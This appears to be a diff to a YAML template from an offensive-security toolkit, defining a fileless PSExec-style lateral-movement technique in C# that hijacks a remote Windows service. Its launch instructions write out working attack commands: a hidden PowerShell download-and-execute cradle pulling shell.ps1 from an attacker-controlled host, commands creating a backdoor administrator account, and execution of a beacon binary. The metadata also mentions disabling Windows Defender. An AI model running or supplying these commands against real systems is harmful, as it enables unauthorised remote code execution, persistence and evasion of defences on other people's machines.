@@ -1,9 +1,9 @@
 meta:
-  name: "Fileless PSExec Lateral Movement (C#)"
+  name: "Fileless PSExec Lateral Movement (C#)*"
   category: "Lateral Movement"
   description: |
     Remote code execution via Windows service manipulation without file upload.
-    
+
     Features:
     - No file upload required (fileless execution)
     - Manipulates remote service configuration
@@ -11,11 +11,11 @@ meta:
     - Disables Windows Defender signatures (optional first pass)
     - Restores service configuration after execution
     - Works over SMB/RPC
-    
+
     This technique connects to a remote Windows machine's Service Control Manager,
     modifies an existing service's binary path, starts it to execute your command,
     then restores the original configuration. No files are dropped on disk.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: "high"
@@ -72,26 +72,42 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 {{ source_file }}"
   launch_instructions: |
-    C# Fileless PSExec Lateral Movement - Launch Instructions
+    # Enumerate Target Services
 
-    Enumerate Target Services:
+    ```powershell
     Get-Service -ComputerName {{ target_host }}
-    $ sc \\{{ target_host }} query
+    sc \\{{ target_host }} query
+    ```
 
-    Execute Fileless PSExec:
-    {{ output_file }} {{ target_host }} {{ service_name }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{{ lhost }}/shell.ps1')"
+    # Execute Fileless PSExec
 
-    Example - Add Local Admin:
+    ```cmd
+    {{ output_file }} {{ target_host }} {{ service_name }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
+    ```
+
+    # Example - Add Local Admin
+
+    ```cmd
     {{ output_file }} {{ target_host }} {{ service_name }} "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
+    ```
 
-    Example - Execute Binary:
+    # Example - Execute Binary
+
+    ```cmd
     {{ output_file }} {{ target_host }} {{ service_name }} "C:\\Windows\\Temp\\beacon.exe"
+    ```
 
-    Verify Execution:
-    $ type \\{{ target_host }}\C$\Temp\out.txt
+    # Verify Execution
+
+    ```cmd
+    type \\{{ target_host }}\C$\Temp\out.txt
+    ```
+
+    ```powershell
     Get-Process -ComputerName {{ target_host }}
+    ```
 
-    Notes:
+    # Notes
     - Target: {{ target_host }}, Service: {{ service_name }}, Command: {{ binary_to_run }}
     - Executes as NT AUTHORITY\SYSTEM on target (service context)
     - Requires admin credentials for remote SCM access (ports 135, 139, 445)
